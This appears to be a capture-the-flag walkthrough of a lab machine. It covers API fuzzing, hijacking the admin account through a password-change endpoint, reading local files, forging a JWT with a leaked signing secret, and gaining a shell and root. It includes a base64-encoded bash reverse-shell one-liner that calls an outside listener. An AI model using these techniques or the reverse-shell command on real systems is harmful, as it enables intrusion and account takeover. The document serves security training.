## RUSTSCAN:
`PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZBURYGCLr4lZI1F55bUh/6vKCfmeGumtAhhNrg9lH4UNDB/wCjPbD+xovPp3UdbrOgNdqTCdZcOk5rQDyRK2YH6tq8NlP59myIQV/zXC9WQnhxn131jf/KlW78vzWaLfMU+m52e1k+YpomT5PuSMG8EhGwE5bL4o0Jb8Unafn13CJKZ1oj3awp31fRJDzYGhTjl910PROJAzlOQinxRYdUkc4ZT0qZRohNlecGVsKPpP+2Ql+gVuusUEQt7gPFPBNKw3aLtbLVTlgEW09RB9KZe6Fuh8JszZhlRpIXDf9b2O0rINAyek8etQyFFfxkDBVueZA50wjBjtgOtxLRkvfqlxWS8R75Urz8AR2Nr23AcAGheIfYPgG8HzBsUuSN5fI8jsBCekYf/ZjPA/YDM4aiyHbUWfCyjTqtAVTf3P4iqbEkw9DONGeohBlyTtEIN7pY3YM5X3UuEFIgCjlqyjLw6QTL4cGC5zBbrZml7eZQTcmgzfU6pu220wRo5GtQ3U=
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZPKXFj3JfSmJZFAHDyqUDFHLHBRBRvlesLRVAqq0WwRFbeYdKwVIVv0DBufhYXHHcUSsBRw3/on9QM24kymD0=
|   256 2221e9f485908745161f733641ee3b32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDIBMvrXLaYc6DXKPZaypaAv4yZ3DNLe1YaBpbpB8aY
80/tcp open  http    syn-ack ttl 63 uvicorn
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     date: Thu, 16 Feb 2023 16:39:23 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest:
|     HTTP/1.1 200 OK
|     date: Thu, 16 Feb 2023 16:39:12 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     date: Thu, 16 Feb 2023 16:39:18 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
| http-methods:
|_  Supported Methods: GET
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service `
* * *
## HTTP:
So far no subdomains have been found:
![92f00b2f6592b9dd668ea1f09630f052.png](../../_resources/92f00b2f6592b9dd668ea1f09630f052.png)

Following webdirectories have been found from a fuzzing:
![8327b69ab01b95dbb4e79bc3d34a8aec.png](../../_resources/8327b69ab01b95dbb4e79bc3d34a8aec.png)

Going more in deept:
![f53911b6dd68e217b910472ab9ec609c.png](../../_resources/f53911b6dd68e217b910472ab9ec609c.png)

Surfing to /api/v1/ we can see that API is expecting to surf for either User or Admin:
![aadcff6bee796b763cf03567bc98e04e.png](../../_resources/aadcff6bee796b763cf03567bc98e04e.png)

Seems like /user is not working?
![da2781b92e7e349fa724dec69ec40179.png](../../_resources/da2781b92e7e349fa724dec69ec40179.png)

But /admin is, and it need to be authenticated:
![052711a6aaf1afad65fdce5fac94c39c.png](../../_resources/052711a6aaf1afad65fdce5fac94c39c.png)

Same game:
![25cfd077969c6ef4c2e92b44635685c3.png](../../_resources/25cfd077969c6ef4c2e92b44635685c3.png)

Now from api/v1/admin/file couldn't get anythin more:
![99272804949aa8cd4727a1308d682179.png](../../_resources/99272804949aa8cd4727a1308d682179.png)

So by knowing that website responds in json i think we need to craft a json request to /file in order to read a file? But bear in mind that we must be authenticated otherwise we won't be able to do anything:
![3d386784ed4cc1146cb17e3e0f9208e0.png](../../_resources/3d386784ed4cc1146cb17e3e0f9208e0.png)

Now going back to /api/user/:
![4bd14a31f6368bd275af719dffc0b13f.png](../../_resources/4bd14a31f6368bd275af719dffc0b13f.png)

Seems like we get some changes with integers with size 141:
![1301778f30cdc0814e8b1006994aa2f3.png](../../_resources/1301778f30cdc0814e8b1006994aa2f3.png)

What if we try to search those values in /user/xxx:
![de774d12e39feb76124d4b711675ab75.png](../../_resources/de774d12e39feb76124d4b711675ab75.png)

And we have a user:
![a8b07798fdcc8a7c772389b07ec8a7a2.png](../../_resources/a8b07798fdcc8a7c772389b07ec8a7a2.png)

But if we search for cgi-bin we get an error telling that value must be an Integer ID:
![cc2ed9bcf7e7780fdbf5e3d74d3b67b4.png](../../_resources/cc2ed9bcf7e7780fdbf5e3d74d3b67b4.png)

So far we could't get more than one user from /user with a GET request but what if we fuzz with POST request instead? 
Here like allways FFUF and WFUZZ gives back different values i still can't understand why...
![a1fb5983eca79d9ae08335556c1702b0.png](../../_resources/a1fb5983eca79d9ae08335556c1702b0.png)

Edit: The solution if we want to use FFUF is to use -mc all (to match all the HTTP codes) and the chain it with -hc 405 to hide all the wrong ones answering with HTTP 405.
![92bfe4dc33e01726141529c33c51cd53.png](../../_resources/92bfe4dc33e01726141529c33c51cd53.png)

Now we have 2 new functions login and signup. I guess we need to signup first and then can we login so let's try.
![d3e476fb988bd3e0be43ee6d606e32ac.png](../../_resources/d3e476fb988bd3e0be43ee6d606e32ac.png)

Ok so we must try with POST:
![7e4013a79443f7dbe9418c3cc3b81535.png](../../_resources/7e4013a79443f7dbe9418c3cc3b81535.png)

Trying a dummy json value shipped in a JSON format and HTTP POST gives back a better understanding of how is supposed to be formed. We see that HTTP data is expecting 2 values one is email and other is password:
![a0c21dd3ca867ddb2c1d0ab315992386.png](../../_resources/a0c21dd3ca867ddb2c1d0ab315992386.png)

I had to read about how API works but the request is pretty explicative, the HTTP POST request is expecting 2 paramenters(**email, password**) in the body as JSON structure (	**{ "key" : "value" }**	)
![6981e14c0cebd6d2ed8267e6986524dd.png](../../_resources/6981e14c0cebd6d2ed8267e6986524dd.png)

Doing what we found we have created our user, so let's try to see if we can list it?
![e128092a24cf4f800d69a7f4dd993a09.png](../../_resources/e128092a24cf4f800d69a7f4dd993a09.png)

Now that we know our user is created we can do same and try to login, the structure is similar:
![751854bd64a233899073e903d2189a00.png](../../_resources/751854bd64a233899073e903d2189a00.png)

Adjusting the HTTP POST body to match (**username, password**)  in the body as JSON structure (	**{ "key" : "value" }**	)
![e9c16f3a252d47ec0df46bf4edbb9fac.png](../../_resources/e9c16f3a252d47ec0df46bf4edbb9fac.png)

But we get error, so skipping JSON and instead loggin in as normal CURL we login successfully:
`
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# curl -X POST -d 'username=yovecio18@backend.local&password=Coglione1!' http://backend.htb/api/v1/user/login
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc3MzI4NTEyLCJpYXQiOjE2NzY2MzczMTIsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiNTM2OTMwZDctZGZlNy00ZDc3LWIxMmItMzQ5NTczNWY5N2I4In0.oh2zOMXt1HB29uQ9sge3YjzxEG9UeOxFkH1s3-Pg2Qs","token_type":"bearer"}
`

Now that we got a token we must check it, to do so we can use this page:
https://jwt.io/
![d09aa7f5e6350422e45d1e29758234fa.png](../../_resources/d09aa7f5e6350422e45d1e29758234fa.png)

Now that we know is a JWT we must add it to ourself so we can use it, in order to read files???
![28a5f820bfbee1cd890920cdaaa8b18e.png](../../_resources/28a5f820bfbee1cd890920cdaaa8b18e.png)

Seems like we can read the /docs with new token but we are having error because we need to rewrite headers with Burp for all the pages: 
![cf7382017d17417c6a7d65042d7f0d64.png](../../_resources/cf7382017d17417c6a7d65042d7f0d64.png)

Now if we want to use the JWT token as custom header in Burpsuite we can use this plugin:
https://burpsuite.guide/extensions/add-custom-header/

Adding the token to Proxy it shows us the Swagger page:
![6bc4b8a15cbd031b2b461aeea2541c30.png](../../_resources/6bc4b8a15cbd031b2b461aeea2541c30.png)
![5be14b5fdc4f1b94c956b2e46bc80169.png](../../_resources/5be14b5fdc4f1b94c956b2e46bc80169.png)

Now is where the fun begins, surfing thru the user fuctions we have one to grab first flag:
![ef966bcabd48ed453d623902b5841e75.png](../../_resources/ef966bcabd48ed453d623902b5841e75.png)

Now we need to see how we can become admin so we can execute commands for an RCE i suppose. Now we have a fuction active as our user to change a users password and by knowing that user with ID 1 is a local admin on the API can we maybe reset it?
![7493babb482105390005be26ee6809f6.png](../../_resources/7493babb482105390005be26ee6809f6.png)
Is asking for GUID for the user and a new password string:
![c3ce337654cf11186a363b067c4e8401.png](../../_resources/c3ce337654cf11186a363b067c4e8401.png)

Going back to burp we can read that:
![125cff90305a21fddc3b14686f4decb5.png](../../_resources/125cff90305a21fddc3b14686f4decb5.png)
![0ec37ab821b8added23d847f8670dfdf.png](../../_resources/0ec37ab821b8added23d847f8670dfdf.png)

Sending the query seems like we can reset the password for admin@backend.local:
![a74421c18a05847a2e31aebea3cb8620.png](../../_resources/a74421c18a05847a2e31aebea3cb8620.png)

Now we should try to login again to get a new JWT tokes as we did last time with our dummy user:
`┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# curl -X POST -d 'username=admin@htb.local&password=Coglione1!' http://backend.htb/api/v1/user/login
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc3MzMwNjMyLCJpYXQiOjE2NzY2Mzk0MzIsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.Ex6oaixa0bCoIyWRTrku-pqDVzbbMjqNX5rAppmxI7s","token_type":"bearer"}`

Now we change the Bearer token in Burpsuite to match the admin account and we try to refresh /docs. Loggin in we see the same Weboage but under Admin now we can see if we are Admins:
![5c88e7d7af5ba4c796c8943ca8ac13c8.png](../../_resources/5c88e7d7af5ba4c796c8943ca8ac13c8.png)

And now that we know for sure we are we can try to execute some CMD towards the machine and maybe invoke a RCE? Now after several try and catch i logged into API from the Authorize button with informations from my JWT token:
![e4724a75386e88fd5a775058291d4f71.png](../../_resources/e4724a75386e88fd5a775058291d4f71.png)
 But every time i try to run a command I get an error that Debug permissions are missing:
 ![616cd40547b420c1e29b7d0f324ef01f.png](../../_resources/616cd40547b420c1e29b7d0f324ef01f.png)
 
 But if i try to read a local file i can do it:
 ![7a212d1ea9e13c92d08267ea97429a06.png](../../_resources/7a212d1ea9e13c92d08267ea97429a06.png)
 
 From /etc/passwd we can read that there are 2 users one is htb and the other is ofcourse root. Now here i had to check for tips and the trick was to read the enviromnetal varialble in linux located at /proc/self/environ:
 ![15ad6ac21b8f93ae04ed1c9d082f3c7e.png](../../_resources/15ad6ac21b8f93ae04ed1c9d082f3c7e.png)
 
 From the result we can see that the path should be under /home/htb/utc and the app should point towards /app/main.py?
 `  "file": "APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc`
 ![2ff93f08432ae9a52016c06f5c04a343.png](../../_resources/2ff93f08432ae9a52016c06f5c04a343.png)
 
 From the result we can find that is importing some functions from /app/core/config.py:
 `import api_router\nfrom app.core.config import settings\n\nfrom`
 So we can guess we can read that file as well:
 ![94b83549a2b2d4959a71319baeaf8159.png](../../_resources/94b83549a2b2d4959a71319baeaf8159.png)
 `{
  "file": "from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator\nfrom typing import List, Optional, Union\n\nfrom enum import Enum\n\n\nclass Settings(BaseSettings):\n    API_V1_STR: str = \"/api/v1\"\n    JWT_SECRET: str = \"SuperSecretSigningKey-HTB\"\n    ALGORITHM: str = \"HS256\"\n\n    # 60 minutes * 24 hours * 8 days = 8 days\n    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8\n\n    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins\n    # e.g: '[\"http://localhost\", \"http://localhost:4200\", \"http://localhost:3000\", \\\n    # \"http://localhost:8080\", \"http://local.dockertoolbox.tiangolo.com\"]'\n    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []\n\n    @validator(\"BACKEND_CORS_ORIGINS\", pre=True)\n    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:\n        if isinstance(v, str) and not v.startswith(\"[\"):\n            return [i.strip() for i in v.split(\",\")]\n        elif isinstance(v, (list, str)):\n            return v\n        raise ValueError(v)\n\n    SQLALCHEMY_DATABASE_URI: Optional[str] = \"sqlite:///uhc.db\"\n    FIRST_SUPERUSER: EmailStr = \"root@ippsec.rocks\"    \n\n    class Config:\n        case_sensitive = True\n \n\nsettings = Settings()\n"
}`

From the response we can grab what is should be the key used to generate the JWT tokens?
`JWT_SECRET: str = \"SuperSecretSigningKey-HTB\"\n `

Now to generate a new JWT token we can use again this page: https://jwt.io/
We need to add the secret JWT token and edit the structure by adding "debug":"true"
![2fac51134e5767a4749770168183d49d.png](../../_resources/2fac51134e5767a4749770168183d49d.png)

Now we can use the new token to check if we have Debug permission and if we can execute RCE?
![badb06af6fe057004e7d5f681f3660f6.png](../../_resources/badb06af6fe057004e7d5f681f3660f6.png)

Id command is working now we make our way to RCE. All tries I am doing are not working, seems like it's  cause all Revshells have special characters and since we are curling may be interpreted as chars. One solution could be to create a payload with MSFVENOM and catch it back with Metepreter. Another which may be more easy would be to encode the payload as base64 and then decode and lastly invoke bash..
Sending this:
`echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzU1NTUgMD4mMQ=='|base64 -d|bash`
Where structure should be echo '<payload in base64>' | base64 -d | bash

This gave us a listeing session in NC:
![8f5c6af49f20bc2cde3a462126312ce5.png](../../_resources/8f5c6af49f20bc2cde3a462126312ce5.png)

Now let's upload a Linpeas and check what can we find?
So far seems like Linpeas is not showing that much so going back to /home/htb/uhc folder to check if we can find any credentials saved into the files.. 
Opening all the files with cat are not showing that much except the auth.log that is seems like is showing a password??
`cat  auth.log
02/17/2023, 10:38:34 - Login Success for admin@htb.local
02/17/2023, 10:41:54 - Login Success for admin@htb.local
02/17/2023, 10:55:14 - Login Success for admin@htb.local
02/17/2023, 10:58:34 - Login Success for admin@htb.local
02/17/2023, 11:03:34 - Login Success for admin@htb.local
02/17/2023, 11:06:54 - Login Success for admin@htb.local
02/17/2023, 11:20:14 - Login Success for admin@htb.local
02/17/2023, 11:28:34 - Login Success for admin@htb.local
02/17/2023, 11:30:14 - Login Success for admin@htb.local
02/17/2023, 11:36:54 - Login Success for admin@htb.local
02/17/2023, 11:45:14 - Login Failure for Tr0ub4dor&3
02/17/2023, 11:46:49 - Login Success for admin@htb.local
02/17/2023, 11:46:54 - Login Success for admin@htb.local
02/17/2023, 11:47:14 - Login Success for admin@htb.local
02/17/2023, 11:48:34 - Login Success for admin@htb.local
02/17/2023, 11:53:34 - Login Success for admin@htb.local
02/17/2023, 12:00:14 - Login Success for admin@htb.local
02/17/2023, 12:33:30 - Login Failure for yovecio@backend.local
02/17/2023, 12:34:10 - Login Failure for yovecio@backend.local
02/17/2023, 12:35:12 - Login Success for yovecio18@backend.local
02/17/2023, 13:10:32 - Login Success for admin@htb.local
02/17/2023, 13:18:48 - Login Success for admin@htb.local`

Can we ssh as ROOT with that?
![bfb883944e8da6ea5f6142cba8a924df.png](../../_resources/bfb883944e8da6ea5f6142cba8a924df.png)

But we can change user from NC session and grab root:
![4a32a93131ac4c13a658cfd962665b94.png](../../_resources/4a32a93131ac4c13a658cfd962665b94.png)

* * *